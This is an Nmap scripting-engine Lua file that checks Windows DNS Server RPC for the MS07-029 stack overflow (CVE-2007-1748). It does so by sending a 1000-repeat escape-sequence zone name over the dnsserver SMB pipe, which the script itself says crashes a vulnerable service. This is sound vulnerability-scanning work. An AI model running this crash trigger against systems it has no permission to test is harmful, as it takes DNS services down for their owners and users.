local msrpc = require "msrpc"
local nmap = require "nmap"
local smb = require "smb"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"
local vulns = require "vulns"

description = [[
Detects Microsoft Windows systems with Dns Server RPC vulnerable to MS07-029.

MS07-029 targets the <code>R_DnssrvQuery()</code> and <code>R_DnssrvQuery2()</code> 
RPC method which isa part of DNS Server RPC interface that serves as a RPC service 
for configuring and getting information from the DNS Server service. 
DNS Server RPC service can be accessed using "\dnsserver" SMB named pipe. 
The vulnerability is triggered when a long string is send as the "zone" parameter 
which causes the buffer overflow which crashes the service.

This check was previously part of smb-check-vulns.
]]
---
--@usage
-- nmap --script smb-vuln-ms07-029.nse -p445 <host>
-- nmap -sU --script smb-vuln-ms07-029.nse -p U:137,T:139 <host>
--
--@output
--Host script results:
--| smb-vuln-ms07-029: 
--|   VULNERABLE:
--|   Windows DNS RPC Interface Could Allow Remote Code Execution (MS07-029)
--|     State: VULNERABLE
--|     IDs:  CVE:CVE-2007-1748
--|           A stack-based buffer overflow in the RPC interface in the Domain Name System (DNS) Server Service in 
--|           Microsoft Windows 2000 Server SP 4, Server 2003 SP 1, and Server 2003 SP 2 allows remote attackers to 
--|           execute arbitrary code via a long zone name containing character constants represented by escape sequences.
--|           
--|     Disclosure date: 2007-06-06
--|     References:
--|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1748
--|_      https://technet.microsoft.com/en-us/library/security/ms07-029.aspx
---

author = {"Ron Bowes", "Jiayi Ye", "Paulino Calderon <calderon()websec.mx>"}
copyright = "Ron Bowes"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive","exploit","dos","vuln"}
-- run after all smb-* scripts (so if it DOES crash something, it doesn't kill
-- other scans have had a chance to run)
dependencies = {
  "smb-brute", "smb-enum-sessions", "smb-security-mode",
  "smb-enum-shares", "smb-server-stats",
  "smb-enum-domains", "smb-enum-users", "smb-system-info",
  "smb-enum-groups", "smb-os-discovery", "smb-enum-processes",
  "smb-psexec",
};


hostrule = function(host)
  return smb.get_port(host) ~= nil
end

local VULNERABLE = 1
local PATCHED    = 2
local UNKNOWN    = 3
local NOTUP      = 8

---Check the existence of ms07_029 vulnerability in Microsoft Dns Server service.
--This check is not safe as it crashes the Dns Server RPC service its dependencies.
--@param host Host object.
--@return (status, result)
--* <code>status == false</code> -> <code>result == NOTUP</code> which designates
--that the targeted Dns Server RPC service is not active.
--* <code>status == true</code> ->
-- ** <code>result == VULNERABLE</code> for vulnerable.
-- ** <code>result == PATCHED</code> for not vulnerable.

function check_ms07_029(host)
  --create the SMB session
  local status, smbstate
  status, smbstate = msrpc.start_smb(host, msrpc.DNSSERVER_PATH)
  if(status == false) then
    stdnse.debug1("check_ms07_029: Service is not active.")
    return false, NOTUP --if not accessible across pipe then the service is inactive
  end
  --bind to DNSSERVER service
  local bind_result
  status, bind_result = msrpc.bind(smbstate, msrpc.DNSSERVER_UUID, msrpc.DNSSERVER_VERSION)
  if(status == false) then
    stdnse.debug1("check_ms07_029: false")
    msrpc.stop_smb(smbstate)
    return false, UNKNOWN --if bind operation results with a false status we can't conclude anything.
  end
  --call
  local req_blob, q_result
  status, q_result = msrpc.DNSSERVER_Query(
  smbstate,
  "VULNSRV",
  string.rep("\\\13", 1000),
  1)--any op num will do
  --sanity check
  msrpc.stop_smb(smbstate)
  if(status == false) then
    stdnse.debug1("check_ms07_029: DNSSERVER_Query failed")
    if(q_result == "NT_STATUS_PIPE_BROKEN") then
      return true, VULNERABLE
    else
      return true, PATCHED
    end
  else
    return true, PATCHED
  end
end

action = function(host)
  local status, result, message
  local response = {}
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host)
  local vuln_table = {
    title = 'Windows DNS RPC Interface Could Allow Remote Code Execution (MS07-029)',
    state = vulns.STATE.NOT_VULN,
    description = [[
    A stack-based buffer overflow in the RPC interface in the Domain Name System (DNS) Server Service in 
    Microsoft Windows 2000 Server SP 4, Server 2003 SP 1, and Server 2003 SP 2 allows remote attackers to 
    execute arbitrary code via a long zone name containing character constants represented by escape sequences.
    ]],
    IDS = {CVE = 'CVE-2007-1748'},
    references = {
      'https://technet.microsoft.com/en-us/library/security/ms07-029.aspx'
    },
    dates = {
      disclosure = {year = '2007', month = '06', day = '06'},
    }
  }

  -- Check for ms07-029
  status, result = check_ms07_029(host)
  if(status == false) then
    if(result == NOTUP) then
      vuln_table.extra_info = "Service is not active."
      vuln_table.state = vulns.STATE.NOT_VULN
    else
      vuln_table.state = vulns.STATE.NOT_VULN
    end
  else
    if(result == VULNERABLE) then
      vuln_table.state = vulns.STATE.VULN
   else
      vuln_table.state = vulns.STATE.NOT_VULN
    end
  end
  return vuln_report:make_output(vuln_table)
end
